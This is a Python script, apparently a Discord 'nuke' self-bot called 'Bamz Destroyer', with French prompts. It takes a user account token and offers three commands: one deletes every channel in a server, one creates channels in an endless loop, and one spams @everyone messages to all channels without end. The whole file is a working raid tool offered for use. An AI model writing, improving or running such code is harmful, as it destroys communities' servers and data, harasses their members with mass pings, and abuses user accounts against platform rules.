from time import sleep
import discord
from discord.ext import commands
from tkinter import *
import os
from turtle import color
import ctypes
from time import sleep


# Menu

os.system("color 5")
ctypes.windll.kernel32.SetConsoleTitleW("/!\ ")
print("___.                                 .___               __                                    ")
print("\_ |__ _____    _____ ________    __| _/____   _______/  |________  ____ ___.__. ___________ ")
print(" | __ \\__  \  /     \\___   /    / __ |/ __ \ /  ___/\   __\_  __ \/  _ <   |  |/ __ \_  __ ")
print(" | \_\ \/ __ \|  Y Y  \/    /     / /_/ \  ___/ \___ \  |  |  |  | \(  <_> )___  \  ___/|  | \/")
print(" |___  (____  /__|_|  /_____ \    \____ |\___  >____  > |__|  |__|   \____// ____|\___  >__|   ")
print("     \/     \/      \/      \/          \/    \/     \/                     \/         \/       ")
print("                             Bienvenue dans Bamz Destroyer (Self-Bot)                              ")
print("                                        Fait Par VENOM                                         ")
print("\n\n\n")

# Définitions des bases pour le programme



# Programme

# Vérification

verif = "1234"
user = str(input("Entrez les chiffres du fichier 'vérification.txt' pour vous vérifier > "))


if user == verif:
    print("___________________________________________________________________")
    print("\n")
    token = str(input("Inserez le token ici > "))
    message = str(input("Inserez le message de spam > "))
    channels_name = str(input("Inserez le nom des salons > "))
    prefix = str(input("Inserez votre prefix pour les commandes > "))

    client = commands.Bot(command_prefix=prefix, self_bot=True)
    client.remove_command("help")

        

    @client.event
    async def on_connect():
        print("\n")
        print("___________________________________________________________________")
        print("\n")
        print(f"Connexion à {token}")
        sleep(1)
        print("\n")
        print("___________________________________________________________________")
        print("\n")
        print(f"Le message de spam a été définis en {message}")
        print(f"Le message des salons ont été définis en {channels_name}")
        sleep(1)

        print("\n\n")
        print(" spam | Spam \n ccr | Spam channels \n cdel | Delete all channels")

    @client.command(pass_context=True)
    async def ccr(ctx):
        guild = ctx.message.guild
        await ctx.message.delete()
        for i in range(1):
            await guild.create_text_channel(f"{channels_name}")
        while True:
            for channel in guild.text_channels:
                for i in range(500):
                    await guild.create_text_channel(f"{channels_name}")

    @client.command(pass_context=True)
    async def cdel(ctx):
        await ctx.message.delete()

        for channel in list(ctx.message.guild.channels):
            try:
                await channel.delete()
            except:
                pass

    @client.command(pass_context=True)
    async def spam(ctx):
        guild = ctx.message.guild
        await ctx.message.delete()
        for i in range(2):
            while True:
                for channel in guild.text_channels:
                    await channel.send(f"{message} @everyone")

    
    client.run(token, bot=False)

else:
    print("___________________________________________________________________")
    print("\n\n La vérification est invalide")